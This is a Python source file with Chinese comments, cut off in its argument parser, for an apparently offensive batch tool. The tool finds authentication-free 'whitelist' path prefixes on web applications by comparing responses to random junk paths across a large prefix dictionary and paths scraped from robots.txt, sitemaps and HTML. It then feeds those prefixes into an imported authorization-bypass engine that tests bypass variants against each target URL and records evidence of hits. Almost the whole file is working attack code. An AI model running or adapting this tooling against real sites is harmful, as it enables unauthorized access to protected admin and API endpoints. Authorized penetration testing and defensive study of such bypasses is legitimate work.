#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
whitelist_probe.py —— 批量白名单前缀探测 + 自动权限绕过链路工具 v2.0
================================================================
两阶段自动化：
  阶段一  批量探测每个 URL 的免鉴权白名单前缀（匿名 404 指纹法）
  阶段二  将探测结果自动注入 authz_bypass_v3_4.py 的借道全积引擎，
          对每个目标执行完整越权绕过测试（复用其判定/复核/证据体系）

阶段一：白名单探测（404 指纹法）
----------------------------------------------------------------
鉴权 Filter/中间件在路由之前执行：
  · 白名单前缀下的随机垃圾路径 → Filter 放行 → 路由层 404/405/400/410
  · 非白名单前缀下的同样路径   → Filter 先拦 → 401/403/跳登录页
先用根级垃圾路径确认站点确有全局鉴权（防全站 404 的 SPA/网关误判）；
无全局鉴权时自动降级为弱信号（前缀根匿名 2xx 且非登录页）。

候选来源五路合并：内置字典 213 条×7 生态组 / robots.txt / sitemap.xml /
目标页 HTML 资源引用 / --extra-candidate 手工注入。
探测维度：多上下文级（站点根 + 目标全部祖先目录）/ 文件级候选 /
边界检测（startsWith 误配 + 大小写不敏感）。

阶段二：自动绕过（依赖同目录 authz_bypass_v3_4.py）
----------------------------------------------------------------
· 复用 v3.4 全部插件（借道全积/目录穿越/编码解码/方法覆盖/认证构造...）
· 探测到的白名单前缀（高/中置信）自动作为 --whitelist-prefix 注入
· 基线自适应 + evaluate 判定 + ★命中二次复核 + 重定向链分析 + 证据留存
· 每目标输出 CSV 报告，最后输出全目标汇总

用法
----------------------------------------------------------------
python whitelist_probe.py --url http://t1/app/admin/user/list --url http://t2/api/secret
python whitelist_probe.py --url-file targets.txt --cookie "sid=xxx" --high-cookie "sid=admin"
python whitelist_probe.py --url http://t/... --no-bypass          # 仅探测白名单
"""

import argparse
import asyncio
import csv
import json
import os
import re
import sys
import time
from collections import defaultdict
from urllib.parse import urljoin, urlparse

try:
    import aiohttp
except ImportError:
    print("[-] 缺少依赖，请先执行: pip install aiohttp")
    sys.exit(1)

# ---------------------------------------------------------------------------
# 阶段二依赖：同目录的 authz_bypass_v3_4.py（借道全积/判定/复核引擎）
# ---------------------------------------------------------------------------
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)
try:
    import authz_bypass_v3_4 as authz
    AUTHZ_VERSION = authz.VERSION
except ImportError as _e:
    authz = None
    AUTHZ_VERSION = None

VERSION = "2.0"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

MAX_BODY = 64 * 1024

# ---------------------------------------------------------------------------
# 候选字典（按生态分组）
# ---------------------------------------------------------------------------
CANDIDATE_GROUPS = {
    "静态资源": [
        "static", "statics", "public", "public_html", "assets", "asset",
        "res", "resources", "resource", "js", "css", "images", "image",
        "img", "imgs", "pics", "pic", "photo", "photos", "media", "videos",
        "fonts", "icons", "icon", "files", "file", "download", "downloads",
        "upload", "uploads", "uploadfile", "uploadfiles", "attachment",
        "attachments", "dist", "build", "webpack", "pkg", "lib", "libs",
        "webjars", "favicon.ico", "robots.txt", "sitemap.xml",
        "crossdomain.xml", "css.map", "swagger-ui.css",
    ],
    "Java生态": [
        "druid", "druid/index.html", "swagger", "swagger-ui", "swagger-ui.html",
        "swagger-resources", "v2/api-docs", "v3/api-docs", "api-docs",
        "doc.html", "docs", "doc", "api", "api-doc", "knife4j", "gun",
        "gateway", "servlet", "console", "monitor", "monitoring", "sentinel",
        "nacos", "dubbo", "eureka", "hystrix", "turbine", "zipkin",
        "skywalking", "jolokia", "jmx-console", "web-console", "manager",
        "html", "manager/html", "error", "test", "demo", "jsp", "j_spring_security_check",
    ],
    "SpringActuator": [
        "actuator", "actuator/health", "actuator/env", "actuator/beans",
        "actuator/mappings", "actuator/configprops", "actuator/metrics",
        "actuator/trace", "actuator/heapdump", "actuator/loggers",
        "actuator/threaddump", "actuator/info", "actuator/gateway",
        "health", "healthz", "metrics", "info", "env", "beans", "mappings",
    ],
    "认证端点": [
        "login", "login.html", "login.do", "signin", "sign-in", "logout",
        "register", "signup", "captcha", "captcha.jpg", "verify", "kaptcha",
        "getCode", "sendCode", "sms", "auth", "authorize", "oauth", "oauth2",
        "openid", "sso", "cas", "token", "tokens", "jwt", "refresh",
        "refresh_token", "password", "forget", "resetpwd", "unauth",
        "401", "403", "validate", "checkcode", "imagecode",
    ],
    "微软PHP杂项": [
        "elmah", "elmah.axd", "trace.axd", "WebResource.axd", "ScriptResource.axd",
        "graphql", "graphiql", "playground", "phpinfo.php", "adminer.php",
        "wp-login.php", "ping", "pong", "version", "status", "heartbeat",
        "alive", "flag", "metrics.json", "actuator.json", "dump", "info.php",
    ],
    "前端移动": [
        "h5", "m", "mobile", "app", "wap", "wx", "wechat", "weixin",
        "android", "ios", "pc", "web", "www", "index.html", "main.html",
        "home", "portal", "front", "frontend", "page", "pages", "views",
    ],
    "中文业务": [
        "getCode", "sendSms", "smscode", "yzm", "tucao", "about", "help",
        "faq", "notice", "announcement", "agreement", "privacy", "protocol",
        "share", "preview", "view", "read", "news", "article", "banner",
        "config", "configs", "dict", "common", "util", "utils", "data",
    ],
}

FILE_SUFFIX_MARK = "."
ROUTE_CODES = {400, 404, 405, 410}
DENY_CODES = {401, 403}
REDIRECT_CODES = {301, 302, 303, 307, 308}
LOGIN_HINT_RE = re.compile(r"(?i)login|signin|sign-in|sso|cas|auth|oauth|token|passport|redirect")
HTML_PATH_RE = re.compile(r"""(?:href|src|action|data-url)\s*=\s*["']([^"'#?]+)""")
ROBOTS_DISALLOW_RE = re.compile(r"(?im)^(?:disallow|allow):\s*(\S+)")
SITEMAP_LOC_RE = re.compile(r"(?im)<loc>\s*([^<\s]+)\s*</loc>")


# ---------------------------------------------------------------------------
# 阶段一基础设施
# ---------------------------------------------------------------------------
class RateLimiter:
    def __init__(self, delay, concurrency):
        self.delay = delay
        self.sem = asyncio.Semaphore(concurrency)
        self.last = 0.0
        self.lock = asyncio.Lock()

    async def acquire(self):
        await self.sem.acquire()
        async with self.lock:
            now = time.monotonic()
            wait = self.last + self.delay - now
            if wait > 0:
                await asyncio.sleep(wait)
            self.last = time.monotonic()

    def release(self):
        self.sem.release()


class Client:
    """匿名探测客户端（DummyCookieJar）。瞬时错误自动重试一次防漏报。"""

    def __init__(self, timeout=15.0, proxy=None, cookie=None):
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.proxy = proxy
        self.cookie = cookie
        self._session = None
        self.errors = 0

    async def session(self):
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                timeout=self.timeout, cookie_jar=aiohttp.DummyCookieJar(),
                headers={"User-Agent": UA, "Accept": "*/*", "Connection": "keep-alive"})
        return self._session

    async def get(self, url, limiter, max_redirect=False):
        last = None
        for attempt in range(2):
            await limiter.acquire()
            start = time.monotonic()
            headers = {"Cookie": self.cookie} if self.cookie else {}
            try:
                s = await self.session()
                async with s.get(url, headers=headers, allow_redirects=max_redirect,
                                 proxy=self.proxy) as r:
                    body = (await r.content.read(MAX_BODY))[:4096].decode("utf-8", "replace")
                    return {"code": r.status, "len": len(body), "body": body,
                            "ctype": r.headers.get("Content-Type", ""),
                            "location": r.headers.get("Location", ""),
                            "err": None, "rtt": round(time.monotonic() - start, 3)}
            except asyncio.TimeoutError:
                last = {"code": -1, "len": 0, "body": "", "ctype": "",
                        "location": "", "err": "timeout", "rtt": self.timeout.total}
            except aiohttp.ClientError as e:
                last = {"code": -1, "len": 0, "body": "", "ctype": "",
                        "location": "", "err": type(e).__name__,
                        "rtt": round(time.monotonic() - start, 3)}
            except Exception as e:
                last = {"code": -1, "len": 0, "body": "", "ctype": "",
                        "location": "", "err": f"{type(e).__name__}:{e}",
                        "rtt": round(time.monotonic() - start, 3)}
            finally:
                limiter.release()
            if attempt == 0:
                self.errors += 1
                await asyncio.sleep(0.3)
        return last

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()


def is_login_redirect(location):
    return bool(location and LOGIN_HINT_RE.search(location))


def norm_seg(path):
    return path.strip().strip("/")


def target_contexts(url):
    """目标路径的全部祖先目录 + 根。
    /app/admin/user/list → ['', 'app', 'app/admin', 'app/admin/user']"""
    p = urlparse(url).path or "/"
    segs = [s for s in p.split("/") if s]
    if not segs:
        return [""]
    out = [""]
    acc = ""
    for s in segs[:-1] if len(segs) > 1 else segs[:0]:
        acc = f"{acc}/{s}" if acc else s
        out.append(acc)
    if len(segs) == 1:
        out.append(segs[0])
    return out


def build_url(base, ctx, path):
    p = f"/{ctx}/{path}" if ctx else f"/{path}"
    return base.rstrip("/") + p


# ---------------------------------------------------------------------------
# 阶段一：候选收集（五源合并）
# ---------------------------------------------------------------------------
async def collect_robots(client, limiter, base):
    r = await client.get(base + "/robots.txt", limiter)
    if r["err"] or r["code"] != 200 or "text" not in (r["ctype"] or ""):
        return []
    out = []
    for m in ROBOTS_DISALLOW_RE.finditer(r["body"] or ""):
        segs = [s for s in m.group(1).split("?")[0].split("/") if s and s != "*"]
        if not segs:
            continue
        out.append("/".join(segs[:2]))
        out.append(segs[0])
    return out


async def collect_sitemap(client, limiter, base):
    r = await client.get(base + "/sitemap.xml", limiter)
    if r["err"] or r["code"] != 200 or "xml" not in (r["ctype"] or ""):
        return []
    out = []
    for m in SITEMAP_LOC_RE.finditer(r["body"] or ""):
        try:
            segs = [s for s in urlparse(urljoin(base, m.group(1))).path.split("/") if s]
        except Exception:
            continue
        if segs:
            out.append("/".join(segs[:2]))
            out.append(segs[0])
    return out


async def collect_html_paths(client, limiter, page_url):
    r = await client.get(page_url, limiter)
    if r["err"] or r["code"] not in (200, 301, 302, 401, 403):
        return []
    body = r["body"] or ""
    out = []
    for m in HTML_PATH_RE.finditer(body):
        u = m.group(1)
        if u.startswith(("javascript:", "data:", "mailto:", "tel:", "//", "http")):
            continue
        segs = [s for s in urlparse(u).path.split("/") if s]
        if segs:
            out.append("/".join(segs[:2]))
            out.append(segs[0])
    return out


def collect_candidates(extra):
    cands = {}
    for group, items in CANDIDATE_GROUPS.items():
        for it in items:
            n = norm_seg(it)
            if n and n not in cands:
                cands[n] = f"字典/{group}"
    for e in extra:
        n = norm_seg(e)
        if n and n not in cands:
            cands[n] = "手工注入"
    return cands


# ---------------------------------------------------------------------------
# 阶段一：探测与判定
# ---------------------------------------------------------------------------
def classify(root_denied, junk, prefix_root):
    if junk["err"]:
        return False, "-", "请求失败", f"错误: {junk['err']}"
    denied = junk["code"] in DENY_CODES or is_login_redirect(junk["location"])
    if denied:
        return False, "-", "鉴权拦截", f"垃圾路径 HTTP {junk['code']}"
    routed = junk["code"] in ROUTE_CODES
    ok = junk["code"] == 200 and not is_login_redirect(junk["location"])
    loginish_body = bool(junk["body"]) and LOGIN_HINT_RE.search(junk["body"][:512])
    if root_denied:
        if routed:
            ev = f"垃圾路径 HTTP {junk['code']}"
            if prefix_root and prefix_root["code"] == 200:
                ev += "；前缀根 HTTP 200"
            return True, "高", "强信号(路由穿透)", ev
        if ok and not loginish_body:
            return True, "中", "疑似穿透", "垃圾路径 HTTP 200 且非登录内容（泛解析需人工确认）"
        if ok and loginish_body:
            return False, "-", "登录页", "垃圾路径返回登录页内容"
        return False, "-", "无差异", f"垃圾路径 HTTP {junk['code']}"
    if prefix_root and prefix_root["code"] == 200 and not is_login_redirect(prefix_root["location"]) \
            and not LOGIN_HINT_RE.search((prefix_root["body"] or "")[:512]):
        return True, "低", "弱信号(无全局鉴权)", f"前缀根匿名 200 ({prefix_root['ctype'][:30]})"
    if routed:
        return True, "低", "弱信号(路由可达)", f"垃圾路径 HTTP {junk['code']}"
    return False, "-", "无差异", f"垃圾路径 HTTP {junk['code']}"


async def probe_candidate(client, limiter, base, ctx, cand, source, root_denied, junk):
    is_file = FILE_SUFFIX_MARK in cand.rsplit("/", 1)[-1]
    if is_file:
        r = await client.get(build_url(base, ctx, cand), limiter)
        if r["err"]:
            return None
        if r["code"] == 200:
            conf = "高" if root_denied else "低"
            return {"前缀": cand, "上下文": ctx or "/", "来源": source,
                    "信号": "文件级匿名可达", "置信度": conf,
                    "证据": f"GET {cand} → 200 ({r['ctype'][:30]}, len={r['len']})", "备注": ""}
        return None
    url = build_url(base, ctx, f"{cand}/{junk}")
    jr = await client.get(url, limiter)
    if jr["err"]:
        return None
    root_r = None
    if jr["code"] in (ROUTE_CODES | {200}) or is_login_redirect(jr["location"]) \
            or jr["code"] in DENY_CODES:
        root_r = await client.get(build_url(base, ctx, cand) + "/", limiter)
    hit, conf, signal, ev = classify(root_denied, jr, root_r)
    if not hit:
        return None
    return {"前缀": cand, "上下文": ctx or "/", "来源": source,
            "信号": signal, "置信度": conf, "证据": ev, "备注": ""}


async def boundary_checks(client, limiter, base, ctx, cand):
    notes = []
    junk = "authz_probe_" + os.urandom(4).hex()
    base_seg = cand.split("/")[0]
    r = await client.get(build_url(base, ctx, f"{base_seg}x9z/{junk}"), limiter)
    if not r["err"] and r["code"] in ROUTE_CODES:
        notes.append(f"前缀匹配疑似 startsWith（/{base_seg}x9z 同样穿透 → HTTP {r['code']}）")
    swapped = base_seg[0].swapcase() + base_seg[1:]
    if swapped != base_seg:
        r2 = await client.get(build_url(base, ctx, f"{swapped}/{junk}"), limiter)
        if not r2["err"] and r2["code"] in ROUTE_CODES:
            notes.append(f"大小写不敏感（/{swapped} 同样穿透 → HTTP {r2['code']}）")
    return notes


def full_path_of(r):
    ctx = r["上下文"].strip("/")
    return f"/{ctx}/{r['前缀']}" if ctx else f"/{r['前缀']}"


# ---------------------------------------------------------------------------
# 阶段一主流程（单目标）
# ---------------------------------------------------------------------------
async def probe_target(idx, total, target, client, limiter, args, out_base):
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    print("\n" + "=" * 78)
    print(f" [{idx}/{total}] 阶段一：白名单前缀探测  {target}")
    print("=" * 78)

    junk_root = "authz_probe_" + os.urandom(5).hex()
    root_probe = await client.get(f"{base}/{junk_root}", limiter)
    if root_probe["err"]:
        print(f"[-] 站点根探测失败（{root_probe['err']}），跳过该目标")
        return {"target": target, "ok": False, "reason": root_probe["err"], "found": []}
    root_denied = root_probe["code"] in DENY_CODES or is_login_redirect(root_probe["location"])
    print(f"[*] 根级指纹: HTTP {root_probe['code']}"
          + (f" → {root_probe['location'][:50]}" if root_probe["location"] else "")
          + ("  [全局鉴权确认，强信号]" if root_denied else "  [未确认全局鉴权，弱信号]"))

    extra = [e for chunk in (args.extra_candidate or []) for e in chunk.split(",")]
    cands = collect_candidates(extra)
    robots = await collect_robots(client, limiter, base)
    for p in robots:
        n = norm_seg(p)
        if n and n not in cands:
            cands[n] = "robots.txt"
    sitemap = await collect_sitemap(client, limiter, base)
    for p in sitemap:
        n = norm_seg(p)
        if n and n not in cands:
            cands[n] = "sitemap.xml"
    html_paths = await collect_html_paths(client, limiter, target)
    for p in html_paths:
        n = norm_seg(p)
        if n and n not in cands:
            cands[n] = "页面引用"

    ctxs = target_contexts(target)
    print(f"[*] 候选 {len(cands)} 个 × 上下文 {ctxs}")

    junk = "authz_probe_" + os.urandom(5).hex()
    results = []

    async def one(ctx, cand, source):
        r = await probe_candidate(client, limiter, base, ctx, cand, source, root_denied, junk)
        if r:
            results.append(r)

    tasks = [one(ctx, cand, src) for ctx in ctxs for cand, src in cands.items()]
    CHUNK = 200
    done = 0
    for i in range(0, len(tasks), CHUNK):
        await asyncio.gather(*tasks[i:i + CHUNK])
        done += min(CHUNK, len(tasks) - i)
        print(f"    探测进度 {done}/{len(tasks)}，命中 {len(results)}", end="\r")
    print()
    if client.errors:
        print(f"[!] 瞬时错误重试 {client.errors} 次（已恢复）")

    if not results:
        print("[-] 未发现免鉴权白名单前缀")
        return {"target": target, "ok": True, "root_denied": root_denied, "found": []}

    by_key = {(r["前缀"], r["上下文"]): r for r in results}
    merged = defaultdict(list)
    for r in by_key.values():
        merged[r["前缀"]].append(r)
    final = []
    for prefix, rows in merged.items():
        main = max(rows, key=lambda x: ("高中低".index(x["置信度"]) if x["置信度"] in "高中低" else -1))
        if len(rows) > 1:
            main["备注"] += f"；另在上下文 [{'/'.join(r['上下文'] for r in rows if r is not main)}] 命中"
        final.append(main)
    # 边界检测（批量模式下限前 15 个，控制请求量）
    for r in final[:15]:
        notes = await boundary_checks(client, limiter, base, r["上下文"].rstrip("/"), r["前缀"])
        if notes:
            r["备注"] += ("；" if r["备注"] else "") + "；".join(notes)

    rank = {"高": 0, "中": 1, "低": 2}
    final.sort(key=lambda x: (rank.get(x["置信度"], 9), x["前缀"]))

    print(f"[+] 发现 {len(final)} 个免鉴权前缀：")
    print(f"  {'完整路径':<28}{'置信度':<6}{'信号':<20}来源")
    print("  " + "-" * 74)
    for r in final:
        print(f"  {full_path_of(r):<28}{r['置信度']:<6}{r['信号']:<20}{r['来源']}")
    for r in final:
        if r["备注"]:
            print(f"  ⚠ {full_path_of(r)}: {r['备注'].strip('；')}")

    pf = f"{out_base}_{idx:02d}_prefixes"
    with open(pf + ".csv", "w", encoding="utf-8-sig", newline="") as f:
        w = csv.DictWriter(f, fieldnames=["前缀", "上下文", "来源", "信号", "置信度", "证据", "备注"])
        w.writeheader()
        w.writerows(final)
    return {"target": target, "ok": True, "root_denied": root_denied,
            "found": final, "report": pf}


# ---------------------------------------------------------------------------
# 阶段二：自动绕过（复用 authz_bypass_v3_4 引擎）
# ---------------------------------------------------------------------------
_OPEN_MANAGERS = []  # 注册表：确保异常路径下所有会话最终被关闭


async def bypass_target(idx, total, wl, args, out_base):
    target = wl["target"]
    print("\n" + "=" * 78)
    print(f" [{idx}/{total}] 阶段二：自动越权绕过测试  {target}")
    print("=" * 78)

    if authz is None:
        print("[-] 未找到 authz_bypass_v3_4.py（需与本工具同目录），阶段二跳过")
        return {"target": target, "ok": False, "reason": "authz模块缺失", "hits": 0}

    manager = authz.RequestManager({
        "low_cookie": args.cookie or "", "high_cookie": args.high_cookie or "",
        "proxy": args.proxy or "", "timeout": args.timeout,
        "delay": args.delay, "jitter": 0.3,
    })
    _OPEN_MANAGERS.append(manager)

    # ---- 基线 ----
    print("[*] 建立基线...")
    base_low, _, _, base_rtts = await authz.get_baseline_adaptive(target, manager, "low", "低权限基线  ")
    base_high = None
    if args.high_cookie:
        base_high, _, _, _ = await authz.get_baseline_adaptive(target, manager, "high", "高权限基线  ")
    p = urlparse(target)
    base_err, _ = await authz.get_error_baseline(f"{p.scheme}://{p.netloc}", manager)
    print(f"    低权限基线: HTTP {base_low['code']} | 高权限: "
          f"{'HTTP ' + str(base_high['code']) if base_high else '无'} | 错误页: "
          f"{'HTTP ' + str(base_err['code']) if base_err else '无'}")
    if base_low["code"] in authz.OK_CODES:
        print("    ⚠ 低权限基线本身就是 2xx：该 URL 可能未受保护，判定将全部跳过")

    # ---- 白名单前缀注入（高/中置信折叠子路径）----
    prefixes, all_paths = [], {full_path_of(r) for r in wl.get("found", [])}
    for r in wl.get("found", []):
        if r["置信度"] not in ("高", "中"):
            continue
        fp = full_path_of(r).strip("/")
        if not fp:
            continue
        if any(f"/{fp}".startswith(q + "/") for q in all_paths) and f"/{fp}" not in all_paths:
            pass
        if fp not in prefixes:
            prefixes.append(fp)
    # 手工注入补充
    for e in (args.whitelist_prefix or []):
        e = norm_seg(e)
        if e and e not in prefixes:
            prefixes.append(e)
    if prefixes:
        print(f"[*] 注入借道白名单前缀 {len(prefixes)} 个: "
              f"{', '.join('/' + x for x in prefixes[:10])}" + (" ..." if len(prefixes) > 10 else ""))
    else:
        print("[!] 无高/中置信前缀可注入，仅测试通用变形")

    # ---- 变形生成 ----
    variants = authz.generate_variants(
        target, args.bypass_categories, None,
        probe_auth=args.probe_auth, combine=args.combine,
        combine_cap=250, extra_prefixes=prefixes, prefix_cap=args.prefix_cap)
    # 发现前缀的变形优先：截断时保证借道全积优先保留实测白名单组合
    if prefixes:
        dp = tuple("/" + x + "/" for x in prefixes)
        variants.sort(key=lambda v: not any(d in v["url"] for d in dp))
    if args.bypass_cap and len(variants) > args.bypass_cap:
        variants = authz.round_robin_slice(variants, args.bypass_cap)
        print(f"[*] --bypass-cap 生效：轮转截取 {len(variants)} 个变形（发现前缀优先）")
    print(f"[*] 生成 {len(variants)} 个变形，开始测试（delay={args.delay}s 并发={args.concurrency}）")

    # ---- 并发执行 ----
    semaphore = asyncio.Semaphore(args.concurrency)
    breaker = {"streak": 0, "active": False}
    rows, done = [], 0

    async def work(v):
        if breaker["active"]:
            return {"variant": v, "resp": {"code": -1, "length": 0, "body": "", "truncated": False,
                                           "location": "", "ctype": "", "server": "", "cache_status": "",
                                           "age": "", "headers": {}, "rtt": 0, "error": "aborted",
                                           "sent_url": v["url"], "rewritten": False},
                    "verdict": "", "note": "已熔断跳过", "confidence": "-"}
        async with semaphore:
            try:
                resp = await manager.send(v["url"], v["method"], v["headers"], kind="low",
                                          body=v.get("body"), use_absolute=bool(v.get("use_absolute")))
            except Exception as e:
                # 防御：个别变形可能触发客户端层异常（如 URL 语法），降级为失败行不中断全局
                resp = {"code": -1, "length": 0, "body": "", "truncated": False,
                        "location": "", "ctype": "", "server": "", "cache_status": "",
                        "age": "", "headers": {}, "rtt": 0, "error": f"{type(e).__name__}",
                        "sent_url": v["url"], "rewritten": False}
        if resp["error"]:
            breaker["streak"] += 1
            if args.abort_after and breaker["streak"] >= args.abort_after:
                breaker["active"] = True
        else:
            breaker["streak"] = 0
        verdict, note, conf = authz.evaluate(resp, v["method"], base_low, base_high,
                                             base_err, args.threshold, base_rtts)
        return {"variant": v, "resp": resp, "verdict": verdict,
                "note": note, "confidence": conf}

    tasks = [asyncio.create_task(work(v)) for v in variants]
    step = max(1, len(tasks) // 20)
    for coro in asyncio.as_completed(tasks):
        row = await coro
        rows.append(row)
        done += 1
        if done % step == 0 or done == len(tasks):
            print(f"    进度 {done}/{len(tasks)}（★{sum(1 for r in rows if r['verdict'] == '★疑似绕过')} "
                  f"△{sum(1 for r in rows if r['verdict'] == '△需复核')}）", end="\r")
    print()

    # ---- 重定向链分析（复用 v3.4 逻辑，样本上限 8）----
    if args.max_redirect_trace and rows:
        candidates = [r for r in rows if r["resp"].get("code") in authz.REDIRECT_CODES
                      and r["resp"].get("location") and r["resp"]["error"] != "aborted"]
        marked = [r for r in candidates if r["variant"].get("follow")]
        others = [r for r in candidates if not r["variant"].get("follow")]
        selected = (marked + [r for r in others if r["verdict"] == "△需复核"]
                    + [r for r in others if r["verdict"] != "△需复核"])[:args.max_redirect_trace]
        if selected:
            print(f"[*] 重定向差异分析：追踪 {len(selected)} 条跳转链...")
            base_chain = await authz.trace_redirect_chain(manager, target, "GET")
            for row in selected:
                v = row["variant"]
                chain = await authz.trace_redirect_chain(manager, v["url"], v["method"],
                                                        v["headers"], body=v.get("body"))
                authz.analyze_redirect_row(row, chain, base_chain, base_low, base_high, args.threshold)

    # ---- 二次复核 + 证据 ----
    hits = [r for r in rows if r["verdict"] == "★疑似绕过"]
    reviews = [r for r in rows if r["verdict"] == "△需复核"]
    if hits:
        print(f"[*] 对 {len(hits)} 个 ★ 命中执行二次复核（匿名1次+低权限2次）...")
        for i, row in enumerate(hits, 1):
            row["verify"], row["confidence"] = await authz.second_verify(row, base_high, manager)
            print(f"    [{i}/{len(hits)}] {row['variant']['cat']}/{row['variant']['desc'][:30]}"
                  f" -> {row.get('verify', '-')} [{row.get('confidence', '-')}]")

    slug = re.sub(r"[^A-Za-z0-9]+", "_", p.netloc + p.path)[:40].strip("_")
    bf = f"{out_base}_{idx:02d}_{slug}"
    if hits and not args.no_evidence:
        authz.save_evidence(bf + "_evidence", hits, redact=args.redact_evidence)

    interesting = [r for r in rows if r["verdict"]]
    with open(bf + ".csv", "w", encoding="utf-8-sig", newline="") as f:
        cols = ["类别", "手法", "方法", "URL", "实际URL", "变形失真", "状态码", "长度", "截断",
                "Location", "RTT秒", "Server", "缓存状态", "判定", "置信度", "响应SHA256",
                "重定向落点", "重定向链", "备注", "复核结论", "同根因变形", "证据文件"]
        w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
        w.writeheader()
        for r in sorted(interesting, key=lambda x: (x["verdict"] != "★疑似绕过",
                                                    x["verdict"] != "△需复核")):
            w.writerow(authz.slim(r))

    if manager in _OPEN_MANAGERS:
        _OPEN_MANAGERS.remove(manager)
    await manager.close()
    verified = [r for r in hits if r.get("verify")]
    print(f"\n[+] 阶段二完成: 变形 {len(rows)} | ★ {len(hits)} | △ {len(reviews)} | 复核确认 {len(verified)}")
    print(f"    报告: {bf}.csv")
    return {"target": target, "ok": True, "variants": len(rows), "hits": len(hits),
            "reviews": len(reviews), "verified": len(verified), "report": bf}


# ---------------------------------------------------------------------------
# 批量编排
# ---------------------------------------------------------------------------
def load_urls(args):
    urls = []
    for u in (args.url or []):
        for piece in u.split(","):
            piece = piece.strip()
            if piece:
                urls.append(piece)
    if args.url_file:
        with open(args.url_file, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    urls.append(line)
    seen, out = set(), []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


async def run(args):
    urls = load_urls(args)
    if not urls:
        print("[-] 未提供目标 URL（--url 可重复/逗号分隔，或 --url-file 文件）")
        return 2

    ts = time.strftime("%Y%m%d_%H%M%S")
    out_base = args.out or f"wlprobe_{ts}"

    print(f"[*] whitelist_probe v{VERSION}"
          + (f" + authz_bypass_v{AUTHZ_VERSION} 引擎" if authz else " [阶段二不可用：缺 authz 模块]"))
    print(f"[*] 目标 {len(urls)} 个 | 绕过阶段: {'关闭(--no-bypass)' if args.no_bypass else '开启'}"
          f" | 代理: {args.proxy or '无'}")

    limiter = RateLimiter(args.delay, args.concurrency)
    client = Client(timeout=args.timeout, proxy=args.proxy)

    wl_results, bp_results = [], []
    for i, target in enumerate(urls, 1):
        try:
            wl = await probe_target(i, len(urls), target, client, limiter, args, out_base)
        except Exception as e:
            print(f"[-] 阶段一异常: {type(e).__name__}: {e}")
            wl = {"target": target, "ok": False, "reason": str(e), "found": []}
        wl_results.append(wl)
        if not args.no_bypass and authz is not None:
            try:
                bp = await bypass_target(i, len(urls), wl, args, out_base)
            except Exception as e:
                print(f"[-] 阶段二异常: {type(e).__name__}: {e}")
                bp = {"target": target, "ok": False, "reason": str(e), "hits": 0}
            bp_results.append(bp)

    # 清理：异常路径遗留的会话统一关闭，避免 Unclosed client session 告警
    for mg in list(_OPEN_MANAGERS):
        try:
            await mg.close()
        except Exception:
            pass
    _OPEN_MANAGERS.clear()
    await client.close()

    # ---- 汇总 ----
    print("\n" + "#" * 78)
    print(f" 批量汇总（{len(urls)} 个目标）")
    print("#" * 78)
    total_prefixes = sum(len(w.get("found", [])) for w in wl_results)
    high_conf = sum(1 for w in wl_results for r in w.get("found", []) if r["置信度"] in ("高", "中"))
    total_hits = sum(b.get("hits", 0) for b in bp_results)
    total_verified = sum(b.get("verified", 0) for b in bp_results)
    total_variants = sum(b.get("variants", 0) for b in bp_results)
    print(f" 白名单前缀: {total_prefixes} 个（高/中置信 {high_conf}）")
    if bp_results:
        print(f" 绕过变形  : {total_variants} 个 | ★命中 {total_hits} | 复核确认 {total_verified}")
    print()
    print(f" {'#':<4}{'目标':<44}{'前缀':<6}{'★':<4}{'复核':<5}状态")
    print(" " + "-" * 76)
    for i, (w, b) in enumerate(zip(wl_results, bp_results + [None] * len(wl_results)), 1):
        n_pre = len(w.get("found", []))
        stars = b.get("hits", 0) if b else "-"
        ver = b.get("verified", 0) if b else "-"
        status = "完成" if w.get("ok") else f"失败({w.get('reason', '?')[:20]})"
        print(f" {i:<4}{w['target'][:42]:<44}{n_pre:<6}{str(stars):<4}{str(ver):<5}{status}")

    summary = {
        "时间": ts, "目标数": len(urls),
        "白名单前缀总数": total_prefixes, "高中置信前缀": high_conf,
        "绕过变形总数": total_variants, "星标命中": total_hits, "复核确认": total_verified,
        "目标明细": [
            {"目标": w["target"], "白名单": w.get("found", []),
             "绕过": {k: v for k, v in b.items() if k != "found"} if b else None}
            for w, b in zip(wl_results, bp_results + [None] * len(wl_results))
        ],
    }
    with open(out_base + "_summary.json", "w", encoding="utf-8") as f:
        json.dump(summary, f, ensure_ascii=False, indent=2)
    print(f"\n[*] 汇总报告: {out_base}_summary.json")

    # 高置信前缀导出（全目标折叠去重）
    all_paths = {full_path_of(r) for w in wl_results for r in w.get("found", [])
                 if r["置信度"] in ("高", "中")}
    exported = [p for p in sorted(all_paths)
                if not any(p.startswith(q + "/") for q in all_paths if q != p)]
    if exported:
        print(f"[*] 独立调用 authz_bypass_v3_4.py 的前缀参数行:\n    "
              + " ".join(f"--whitelist-prefix {p}" for p in exported))
    return 0


def parse_args():
    p = argparse.ArgumentParser(
        description=f"批量白名单前缀探测 + 自动越权绕过链路工具 v{VERSION}")
    p.add_argument("--url", action="append", default=None, metavar="URL",
                   help="目标 URL（可重复指定，亦支持逗号分隔多值）")
    p.add_argument("--url-file", dest="url_file", default=None, metavar="FILE",
                   help="目标 URL 文件（每行一个，# 开头为注释）")
    p.add_argument("--no-bypass", dest="no_bypass", action="store_true",
                   help="仅执行阶段一白名单探测，跳过自动绕过测试")
    # 阶段一选项
    p.add_argument("--extra-candidate", dest="extra_candidate", action="append", default=None,
                   metavar="PATH", help="手工注入候选前缀（可重复，逗号分隔）")
    # 阶段二选项
    p.add_argument("--cookie", default=None, help="低权限 Cookie（阶段二基线用；阶段一恒为匿名）")
    p.add_argument("--high-cookie", dest="high_cookie", default=None,
                   help="高权限 Cookie（提供后启用高权限基线与实锤判定）")
    p.add_argument("--whitelist-prefix", dest="whitelist_prefix", action="append", default=None,
                   metavar="PREFIX", help="阶段二手工补充注入前缀（探测结果会自动注入）")
